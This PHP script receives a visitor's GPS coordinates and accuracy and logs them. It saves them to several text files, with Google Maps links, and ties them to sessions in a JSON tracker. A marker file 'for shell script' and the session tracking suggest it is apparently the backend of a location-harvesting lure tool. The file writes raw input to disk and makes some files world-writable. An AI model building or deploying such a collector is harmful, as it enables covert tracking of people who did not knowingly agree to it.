<?php
// Enhanced location capture with better error handling
header('Content-Type: application/json');

$date = date('dMYHis');
$latitude = isset($_POST['lat']) ? $_POST['lat'] : null;
$longitude = isset($_POST['lon']) ? $_POST['lon'] : null;
$accuracy = isset($_POST['acc']) ? $_POST['acc'] : null;
$sessionId = isset($_POST['session_id']) ? $_POST['session_id'] : null;

// Validate data
if (empty($latitude) || empty($longitude)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Invalid location data'
    ]);
    exit();
}

try {
    // Create marker file for shell script
    file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
    
    // Prepare location data
    $data = "=== Location Captured ===\n";
    $data .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $data .= "Latitude: " . $latitude . "\n";
    $data .= "Longitude: " . $longitude . "\n";
    $data .= "Accuracy: " . $accuracy . " meters\n";
    $data .= "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\n";
    $data .= "Google Maps Search: https://www.google.com/maps/search/?api=1&query=" . $latitude . "," . $longitude . "\n";
    $data .= "\n";
    
    // Save to timestamped file
    $filename = 'location_' . $date . '.txt';
    file_put_contents($filename, $data);
    
    // Save to current location (for immediate display)
    file_put_contents("current_location.txt", $data);
    
    // Append to master location file
    $masterFile = 'saved.locations.txt';
    if (!file_exists($masterFile)) {
        touch($masterFile);
        chmod($masterFile, 0666);
    }
    file_put_contents($masterFile, $data, FILE_APPEND);
    
    // Create saved_locations directory if needed
    if (!is_dir('saved_locations')) {
        mkdir('saved_locations', 0755, true);
    }
    
    // Copy to saved_locations directory
    copy($filename, 'saved_locations/' . $filename);
    
    // Update sessions.json
    $jsonFile = 'sessions.json';
    if (file_exists($jsonFile) && $sessionId) {
        try {
            $sessions = json_decode(file_get_contents($jsonFile), true) ?? [];
            
            if (isset($sessions[$sessionId])) {
                if (!isset($sessions[$sessionId]['locations'])) {
                    $sessions[$sessionId]['locations'] = [];
                }
                
                $sessions[$sessionId]['locations'][] = [
                    'timestamp' => date('Y-m-d H:i:s'),
                    'latitude' => floatval($latitude),
                    'longitude' => floatval($longitude),
                    'accuracy' => floatval($accuracy),
                    'google_maps' => "https://www.google.com/maps/search/?api=1&query={$latitude},{$longitude}"
                ];
                $sessions[$sessionId]['last_activity'] = date('Y-m-d H:i:s');
                
                file_put_contents($jsonFile, json_encode($sessions, JSON_PRETTY_PRINT));
                chmod($jsonFile, 0666);
            }
        } catch (Exception $e) {
            error_log("Error updating sessions.json: " . $e->getMessage());
        }
    }
    
    // Return success
    echo json_encode([
        'status' => 'success',
        'message' => 'Location data saved',
        'data' => [
            'latitude' => $latitude,
            'longitude' => $longitude,
            'accuracy' => $accuracy
        ]
    ]);
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Failed to save location: ' . $e->getMessage()
    ]);
}

exit();
?>
